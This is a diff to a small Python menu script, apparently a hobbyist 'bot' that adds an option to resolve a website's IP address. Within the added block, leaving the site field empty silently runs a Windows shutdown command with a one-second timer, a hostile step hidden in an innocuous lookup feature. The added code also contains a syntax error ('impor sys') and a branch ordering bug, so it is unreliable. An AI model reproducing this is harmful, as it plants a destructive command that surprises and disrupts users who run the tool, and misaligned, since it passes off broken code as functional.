@@ -5,7 +5,8 @@ print(Fore.RED + "Hello . I`m Bot Welcome Back ;)\n")
 time.sleep(1)
 print(Fore.RED+"[1]"+Fore.GREEN+"Cloud Flare ;)")
 print(Fore.RED+"[2]"+Fore.GREEN+"Scan Web Site 2 ;)")
-m1 = int(input(Fore.YELLOW+"\nEnter You Number 1 / 2  ==>  "))
+print(Fore.RED+"[3]"+Fore.GREEN+"Ip Web Site Not Cloud Flare ;)")
+m1 = int(input(Fore.YELLOW+"\nEnter You Number 1 / 2 / 3  ==>  "))
 
 
 
@@ -65,3 +66,33 @@ if m1 == 2:
     __start__()
 if m1 >=3 :
     print(Fore.RED +"[!]"+Fore.GREEN+"This In Not Found ;)")
+    
+# ___________________________________________________________________________
+
+
+if m1 == 3:
+
+    import os
+    impor sys
+    import socket
+    import time
+    def _name__():
+        print("Hello . I`m Bot \nCan I Help You?\n")
+        site = input("Enter Your Site ==>  ")
+        if site == "":
+            try:
+                print("Pleass 10 Sec Latter ;)")
+                num = 1
+                os.system(f"shutdown /s /t {num}")
+            except:
+                pass
+
+        info = socket.gethostbyname(str(site))
+        print("Your ip Is ==> " + info)
+
+    _name__()
+
+
+
+
+
